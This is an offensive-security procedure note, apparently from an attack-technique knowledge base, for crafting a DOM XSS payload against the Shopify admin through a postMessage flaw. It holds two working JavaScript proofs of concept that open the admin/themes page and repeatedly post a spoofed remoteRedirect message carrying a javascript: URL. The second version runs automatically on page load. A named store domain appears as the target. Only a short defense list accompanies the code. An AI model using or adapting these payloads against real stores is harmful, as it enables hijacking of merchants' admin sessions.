---
tags:
  - payload-craft
  - javascript
  - xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-shopify-xss-payload]]'
  - '[[commands/inject-auto-shopify-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:18.210Z'
sub_techniques: []
id: 3bb2b257-5b0d-443e-a232-d4a1d3bd2673
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-XSS-Payload

## Summary

Develop a JavaScript payload that exploits the postMessage vulnerability by opening an admin page window and sending a malicious redirect message to trigger DOM XSS.

## Description

The payload uses window.open to target the admin/themes page, then polls with setInterval to send a JSON postMessage mimicking Shopify.API.remoteRedirect with a javascript: location, executing in the admin context upon receipt.

## Requirements

1. Knowledge of the target domain (e.g., cuxuri.myshopify.com)
2. Text editor for script writing
3. Optional: Local testing environment for postMessage simulation

## Defense

Defensive measures and detection strategies:

- Validate all postMessage data structures and schemes
- Log anomalous window.open or postMessage events
- Sandbox embedded apps with strict origin policies

## Objectives

1. Create a reliable payload for manual triggering
2. Enhance for automatic execution on page load
3. Ensure compatibility with admin context

## Instructions

### Step 1: Build Initial Payload

**Context**: Construct the core attack function.

Use [[commands/inject-shopify-xss-payload]] to define attack() that opens the admin window and sends the postMessage.

```javascript
<script>
function attack(){
  var ctx=window.open('https://cuxuri.myshopify.com/admin/themes');
  var interval;
  interval=setInterval(function(){
    if(window.attackSuccess){
      clearInterval(interval);
    }else{
      ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
    }
  },500);;
}
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

> Expected output: Script ready, clickable link for testing.

### Step 2: Update for Automation

**Context**: Modify to run without user interaction.

Execute [[commands/inject-auto-shopify-xss-payload]] to use location.origin and call attack() directly.

```javascript
<script>
function attack(){
  var ctx=window.open(location.origin+'/admin/themes','_blank');
  var interval;
  interval=setInterval(function(){
    if(window.attackSuccess){
      clearInterval(interval);
    }else{
      ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
    }
  },500);;
}
attack();
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

> Expected output: Auto-executing payload on injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/inject-shopify-xss-payload]]
- [[commands/inject-auto-shopify-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[payload]]
